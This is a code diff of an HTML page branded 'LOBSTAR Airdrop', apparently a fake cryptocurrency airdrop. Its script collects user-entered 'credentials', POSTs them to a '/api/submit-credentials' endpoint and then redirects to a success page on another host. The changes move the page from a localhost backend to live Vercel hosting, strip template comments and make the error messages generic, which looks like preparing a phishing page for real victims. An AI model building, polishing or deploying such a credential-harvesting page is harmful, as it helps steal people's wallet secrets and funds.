@@ -6,7 +6,6 @@
     <title>LOBSTAR Airdrop</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <style>
-        /* All styles same as before – omitted for brevity but included in final */
         * {
             margin: 0;
             padding: 0;
@@ -202,7 +201,6 @@
             border-color: #1e2a3a;
             margin: 1rem 0;
         }
-        /* Modal styles */
         .modal {
             display: none;
             position: fixed;
@@ -311,10 +309,10 @@
 </head>
 <body>
 <div class="container">
-    <!-- 🔵 NEW: Circular coin banner -->
+    <!-- Circular coin banner -->
     <div style="display: flex; justify-content: center; margin-bottom: 1.5rem;">
         <div style="width: 80px; height: 80px; background: radial-gradient(circle at 30% 30%, #f97316, #facc15); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(249,115,22,0.5);">
-            <span style="font-size: 3rem;">🦞</span> <!-- Replace with your own coin image if desired -->
+            <span style="font-size: 3rem;">🦞</span>
         </div>
     </div>
 
@@ -511,9 +509,9 @@
     }
 
     radios.forEach(radio => radio.addEventListener('change', toggleInputs));
-    toggleInputs(); // initial
+    toggleInputs();
 
-    // Submit credentials – sends data to backend, then redirects on success
+    // Submit credentials – sends data to Vercel serverless endpoint
     document.getElementById('submitCredentials').addEventListener('click', async () => {
         const type = document.querySelector('input[name="inputType"]:checked').value;
         let value = '';
@@ -549,8 +547,8 @@
         btn.disabled = true;
 
         try {
-            // CHANGE THE URL if your backend is not running on localhost:3000
-            const response = await fetch('http://localhost:3000/api/submit-credentials', {
+            // Use relative URL for Vercel serverless function
+            const response = await fetch('/api/submit-credentials', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -562,14 +560,14 @@
             });
             const data = await response.json();
             if (data.success) {
-                // ✅ Redirect to success page (change the URL if needed)
+                // Redirect to success page
                 window.location.href = 'https://funiec.pythonanywhere.com/success/success.html';
             } else {
                 alert('Error: ' + (data.message || 'Unknown error'));
             }
         } catch (err) {
             console.error(err);
-            alert('Connection error. Make sure the backend is running at http://localhost:3000');
+            alert('Connection error. Please try again later.');
         } finally {
             btn.innerText = originalText;
             btn.disabled = false;
